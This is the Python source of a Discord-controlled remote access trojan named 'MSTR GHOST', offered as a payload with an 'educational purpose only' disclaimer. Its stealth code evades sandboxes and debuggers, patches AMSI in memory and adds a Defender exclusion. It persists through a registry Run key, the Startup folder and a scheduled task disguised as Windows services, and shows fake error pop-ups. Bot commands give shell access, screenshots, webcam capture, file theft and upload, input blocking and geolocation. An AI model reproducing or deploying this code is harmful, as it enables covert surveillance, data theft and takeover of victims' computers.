#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MSTR GHOST Core Payload - STEALTH ENHANCED
Discord-based Remote Administration Tool
Developed by zoubaire
Educational Purpose Only
"""

import os
import sys
import time
import random
import base64
import hashlib
import ctypes
import subprocess
import threading
import json
import tempfile

# EVASION_CONFIG_PLACEHOLDER

# ============================================================
# STEALTH: DELAYED EXECUTION (Bypass sandbox timeouts)
# ============================================================
time.sleep(random.uniform(1, 3))

# ============================================================
# STEALTH: RANDOM PROCESS NAME (Avoid signature)
# ============================================================
if getattr(sys, 'frozen', False):
    # Running as compiled EXE
    import win32api
    import win32con
    try:
        # Change window title to something innocent
        ctypes.windll.user32.SetWindowTextW(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update")
    except:
        pass

# ============================================================
# ANTI-DEBUG / ANTI-SANDBOX MODULE (Lightweight)
# ============================================================
if ENABLE_ANTI_VM:
    def is_debugged():
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            # Check for common debugger processes
            try:
                import psutil
                debuggers = ["ollydbg", "x64dbg", "windbg", "ida", "procmon", "vboxservice"]
                for proc in psutil.process_iter(['name']):
                    if proc.info['name']:
                        for debugger in debuggers:
                            if debugger in proc.info['name'].lower():
                                return True
            except:
                pass
        except:
            pass
        return False
    
    def is_sandbox():
        try:
            # Check for VM artifacts (quick checks only)
            vm_files = [
                "C:\\Program Files\\VMware",
                "C:\\Program Files\\VirtualBox",
            ]
            for file in vm_files:
                if os.path.exists(file):
                    return True
            
            # Check disk size (quick check)
            try:
                import psutil
                if psutil.disk_usage('/').total < 50_000_000_000:
                    return True
            except:
                pass
        except:
            pass
        return False
    
    # If debugged or sandbox, wait longer then exit (confuse analysis)
    if is_debugged() or is_sandbox():
        time.sleep(30)
        sys.exit(0)

# ============================================================
# AMSI PATCHING MODULE (More stealthy)
# ============================================================
if ENABLE_AMSI_PATCH:
    def patch_amsi():
        try:
            import ctypes.windll
            # Try to load amsi.dll
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            if amsi:
                # Get AmsiScanBuffer address
                scan_buffer = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
                if scan_buffer:
                    # Patch with ret instruction (just return clean)
                    old_protect = ctypes.c_uint32()
                    ctypes.windll.kernel32.VirtualProtect(scan_buffer, 6, 0x40, ctypes.byref(old_protect))
                    # Write ret instruction (0xC3) and return AMSI_RESULT_CLEAN
                    ctypes.memmove(scan_buffer, b'\xB8\x57\x00\x07\x80\xC3', 6)
                    ctypes.windll.kernel32.VirtualProtect(scan_buffer, 6, old_protect, ctypes.byref(old_protect))
        except:
            pass
    
    # Run AMSI patch in background thread
    threading.Thread(target=patch_amsi, daemon=True).start()

# ============================================================
# DEFENDER BYPASS MODULE (Safer)
# ============================================================
if ENABLE_DEFENDER_BYPASS:
    def add_to_exclusions():
        try:
            # Get current directory
            current_dir = os.getcwd()
            # Add to exclusions quietly
            subprocess.run(
                f'powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"',
                shell=True, capture_output=True
            )
        except:
            pass
    
    # Run in background
    threading.Thread(target=add_to_exclusions, daemon=True).start()

# ============================================================
# PERSISTENCE MODULE (With multiple methods)
# ============================================================
if ENABLE_PERSISTENCE:
    def install_persistence():
        try:
            current_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            
            # Registry Run key (HKCU - no admin required)
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, current_path)
            except:
                pass
            
            # Startup folder
            try:
                import shutil
                startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                target = os.path.join(startup, "SystemHelper.exe")
                if not os.path.exists(target):
                    shutil.copy2(current_path, target)
            except:
                pass
            
            # Scheduled task (if admin)
            try:
                if ctypes.windll.shell32.IsUserAnAdmin():
                    task_name = "WindowsSystemMaintenance"
                    subprocess.run(
                        f'schtasks /create /tn "{task_name}" /tr "{current_path}" /sc onlogon /f',
                        shell=True, capture_output=True
                    )
            except:
                pass
        except:
            pass
    
    # Install persistence
    install_persistence()

# ============================================================
# FAKE ERROR MESSAGE (More convincing)
# ============================================================
if ENABLE_FAKE_ERROR:
    def show_fake_error():
        time.sleep(random.uniform(3, 6))
        errors = [
            ("DLL Missing Error", "The program can't start because MSVCR120.dll is missing from your computer. Try reinstalling the program to fix this problem."),
            ("Application Error", "The application was unable to start correctly (0xc000007b). Click OK to close the application."),
            ("Runtime Error", "Runtime Error! Program: C:\\Windows\\System32\\rundll32.exe\n\nThis application has requested the Runtime to terminate it in an unusual way."),
            ("System File Corruption", "Windows detected a hard disk problem.\n\nBack up your files immediately to prevent information loss."),
        ]
        title, message = random.choice(errors)
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
    
    threading.Thread(target=show_fake_error, daemon=True).start()

# ============================================================
# DECRYPT PAYLOAD (Simplified, no crypto dependency)
# ============================================================
def simple_xor_decrypt(data, key):
    """Simple XOR decryption - no external dependencies"""
    result = bytearray()
    key_bytes = key.encode() if isinstance(key, str) else key
    for i, byte in enumerate(data):
        result.append(byte ^ key_bytes[i % len(key_bytes)])
    return bytes(result)

def decrypt_payload():
    """Decrypt token and server ID using simple method"""
    try:
        encrypted_data = "{ENCRYPTED_PAYLOAD}"
        
        if encrypted_data and encrypted_data != "{ENCRYPTED_PAYLOAD}":
            # Use simple XOR with machine-specific key
            machine_key = hashlib.md5(os.getenv('COMPUTERNAME', 'unknown').encode()).hexdigest()[:16]
            encrypted_bytes = base64.b64decode(encrypted_data)
            decrypted = simple_xor_decrypt(encrypted_bytes, machine_key)
            payload = json.loads(decrypted.decode())
            return payload.get("token"), payload.get("server")
        
        return "{bot_token}", "{server_id}"
    except Exception as e:
        return "{bot_token}", "{server_id}"

# ============================================================
# MAIN BOT INITIALIZATION (With error handling)
# ============================================================
def main():
    """Main entry point with comprehensive error handling"""
    bot_token, server_id = decrypt_payload()
    
    if not bot_token or not server_id or bot_token == "{bot_token}":
        return
    
    # Import Discord modules with error handling
    try:
        import discord
        from discord.ext import commands
    except ImportError:
        # Try to install discord.py if missing
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "discord.py"], 
                          capture_output=True, timeout=30)
            import discord
            from discord.ext import commands
        except:
            return
    
    try:
        import pyautogui
        import requests
        from PIL import ImageGrab
    except:
        pyautogui = None
        requests = None
        ImageGrab = None
    
    # Bot configuration
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    @bot.event
    async def on_ready():
        print(f'{bot.user} connected')
        try:
            guild = bot.get_guild(int(server_id))
            if guild:
                channel = discord.utils.get(guild.text_channels, name="session")
                if not channel:
                    channel = await guild.create_text_channel("session")
                await channel.send(f"✅ **System Online**\n📡 `{os.getenv('COMPUTERNAME')}`\n👑 `Admin: {is_admin()}`")
        except:
            pass
    
    @bot.command(name="help")
    async def help_cmd(ctx):
        help_text = """**MSTR GHOST Commands:**

`!shell <cmd>` - Execute system command
`!screenshot` - Take screenshot  
`!download <path>` - Download file
`!upload` - Upload file (attach)
`!cd <path>` - Change directory
`!dir` - List directory
`!admincheck` - Check admin
`!block` - Block input (admin)
`!unblock` - Unblock input (admin)
`!geolocate` - Get location
`!webcampic` - Take webcam photo
`!listprocess` - List processes
`!prockill <name>` - Kill process
`!message <text>` - Show message
`!website <url>` - Open website
`!exit` - Terminate"""
        await ctx.send(help_text)
    
    @bot.command()
    async def shell(ctx, *, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = (result.stdout or result.stderr)[:1900]
            await ctx.send(f"```{output or 'No output'}```")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def screenshot(ctx):
        try:
            if ImageGrab:
                img = ImageGrab.grab()
                img.save("ss.png")
                await ctx.send(file=discord.File("ss.png"))
                os.remove("ss.png")
            else:
                await ctx.send("Screenshot module not available")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def download(ctx, path):
        try:
            if os.path.exists(path) and os.path.isfile(path):
                await ctx.send(file=discord.File(path))
            else:
                await ctx.send("File not found")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def upload(ctx):
        if ctx.message.attachments:
            for att in ctx.message.attachments:
                await att.save(att.filename)
                await ctx.send(f"Saved: {att.filename}")
        else:
            await ctx.send("No file attached")
    
    @bot.command()
    async def cd(ctx, path):
        try:
            os.chdir(path)
            await ctx.send(f"Changed to: {os.getcwd()}")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def dir(ctx):
        try:
            items = "\n".join(os.listdir()[:50])
            await ctx.send(f"```{items or 'Empty directory'}```")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def admincheck(ctx):
        await ctx.send(f"Admin: {is_admin()}")
    
    @bot.command()
    async def block(ctx):
        if is_admin():
            ctypes.windll.user32.BlockInput(True)
            await ctx.send("Input blocked")
        else:
            await ctx.send("Need admin privileges")
    
    @bot.command()
    async def unblock(ctx):
        if is_admin():
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("Input unblocked")
        else:
            await ctx.send("Need admin privileges")
    
    @bot.command()
    async def geolocate(ctx):
        try:
            if requests:
                ip = requests.get("https://api.ipify.org", timeout=10).text
                geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
                await ctx.send(f"IP: {ip}\nLocation: {geo.get('city')}, {geo.get('country')}")
            else:
                await ctx.send("Geolocation module not available")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def webcampic(ctx):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                await ctx.send(file=discord.File("webcam.jpg"))
                os.remove("webcam.jpg")
            cap.release()
        except:
            await ctx.send("Webcam not available")
    
    @bot.command()
    async def listprocess(ctx):
        try:
            import psutil
            procs = [f"{p.info['pid']}: {p.info['name']}" for p in psutil.process_iter(['pid', 'name'])]
            output = "\n".join(procs[:50])
            await ctx.send(f"```{output}```")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def prockill(ctx, name):
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and name.lower() in proc.info['name'].lower():
                    proc.kill()
                    await ctx.send(f"Killed: {proc.info['name']}")
                    return
            await ctx.send("Process not found")
        except Exception as e:
            await ctx.send(f"Error: {str(e)[:100]}")
    
    @bot.command()
    async def message(ctx, *, text):
        if pyautogui:
            pyautogui.alert(text[:255])
            await ctx.send("Message displayed")
        else:
            await ctx.send("Message module not available")
    
    @bot.command()
    async def website(ctx, url):
        subprocess.run(f"start {url}", shell=True)
        await ctx.send(f"Opened: {url}")
    
    @bot.command()
    async def exit(ctx):
        await ctx.send("Terminating...")
        await bot.close()
        sys.exit()
    
    # Run bot with error handling
    try:
        bot.run(bot_token)
    except Exception as e:
        print(f"Bot error: {e}")

if __name__ == "__main__":
    main()